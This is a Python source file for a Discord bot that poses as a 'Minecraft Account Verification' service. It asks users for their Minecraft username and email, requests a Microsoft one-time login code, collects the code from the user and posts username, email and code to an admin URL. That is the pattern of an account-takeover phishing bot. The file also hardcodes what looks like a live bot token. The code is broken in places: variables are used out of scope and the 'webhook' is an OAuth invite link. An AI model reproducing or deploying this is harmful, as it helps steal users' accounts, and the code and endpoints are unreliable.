import discord
import requests
import asyncio
from json.decoder import JSONDecodeError

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print('Bot is ready!')

@client.event
async def on_message(message):
    if message.content == '!verify':
        # Create an embed message to ask for the user's Minecraft username and email
        embed = discord.Embed(
            title='Minecraft Account Verification',
            description='Please enter your Minecraft username and email address to verify your account.'
        )

        # Create the button
        button = discord.ui.Button(
            style=discord.ButtonStyle.success,
            label='Verify',  # Make sure the label matches 'Verify'
            custom_id='verify'  # Custom ID to identify the button
        )

        view = discord.ui.View()
        view.add_item(button)

        await message.reply(embed=embed, view=view)

        # Initialize the response variable
        username_response = None

        try:
            # Wait for the user to respond with their Minecraft username
            username_response = await client.wait_for('message', timeout=60.0,
                                                      check=lambda m: m.author == message.author)
        except asyncio.TimeoutError:
            await message.channel.send('Verification timed out. Please run !verify again.')
            return

        if username_response:
            # Check if the username response is valid (you can add your own validation logic)
            username = username_response.content

            # Now, proceed to ask for the email address
            await username_response.author.send('Please enter your Minecraft email address.')

            try:
                email_response = await client.wait_for('message', timeout=60.0,
                                                       check=lambda m: m.author == message.author)
            except asyncio.TimeoutError:
                await username_response.author.send('Verification timed out. Please run !verify again.')
                return

            if email_response:
                # Check if the email response is a valid email address (you can add your own validation logic)
                email = email_response.content
                if '@' not in email:
                    await username_response.author.send('Please enter a valid email address.')
                    return

                # Continue with the verification process
                await username_response.author.send(
                    f'You entered the email address: {email} and Minecraft username: {username}. We will proceed with verification.')

    if message.content == 'Verify':
        # Ask the user to enter their email
        await message.author.send('Please enter your email address for verification.')

        try:
            # Wait for the user to respond with their email
            email_response = await client.wait_for('message', timeout=60.0, check=lambda m: m.author == message.author)
        except asyncio.TimeoutError:
            await message.author.send('Verification timed out. Please run Verify again.')
            return

        if email_response:
            email = email_response.content

            # Check if the email is valid
            if '@' not in email:
                await message.author.send('Please enter a valid email address.')
                return

            # Request a one-time code from Microsoft using the collected email
            response = requests.post('https://login.live.com/GetOneTimeCode.aspx', data={'email': email})
            try:
                data = response.json()
            except JSONDecodeError:
                await message.author.send(
                    'There was an error verifying your Minecraft account. Please try again later.')
                return

            if 'Code' in data:
                code = data['Code']

                # Send the one-time code to the user
                await message.author.send('A one-time code has been sent to your email address.')

                # Create an embed message to ask the user to enter the one-time code
                embed = discord.Embed(title='Minecraft Account Verification',
                                      description='Please enter the one-time code that was sent to your email address.')

                # Add a button to the embed message
                buttons = [
                    discord.ui.Button(style=discord.ButtonStyle.success, label='Enter Code', custom_id='enter_code')
                ]

                view = discord.ui.View()
                view.add_item(buttons)

                await message.author.send(embed=embed, view=view)

            else:
                await message.author.send(
                    'There was an error getting a one-time code from Microsoft. Please try again later.')

    if message.content == 'enter_code':
        # Get the one-time code from the user
        code = message.content

        # Verify the one-time code with Microsoft
        response = requests.post('https://login.live.com/PPS.SSPR.CO.aspx', data={'code': code})
        data = response.json()

        # If the one-time code is valid, verify the user's account and send a message to the admin
        if 'Success' in data and data['Success']:
            username = message.author.name
            email = email_response.content  # Use the email_response that you obtained earlier

            # Verify the user's account
            # ...

            # Send a message to the admin (replace with your actual webhook URL)
            webhook_url = 'https://discord.com/api/oauth2/authorize?client_id=1164470691823898654&permissions=536872960&scope=bot'
            data = f'Username: {username}\nEmail: {email}\nCode: {code}'
            requests.post(webhook_url, data={'content': data})

            # Send a message to the user
            await message.author.send('Your Minecraft account has been verified!')
        else:
            await message.author.send('There was an error verifying your Minecraft account. Please try again later.')

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
client.run('MTE2NDQ3MDY5MTgyMzg5ODY1NA.GWFKpd.Rs3KlalfhaaZwFJM3rFS1SFDw2fndIlpYyfuGo')
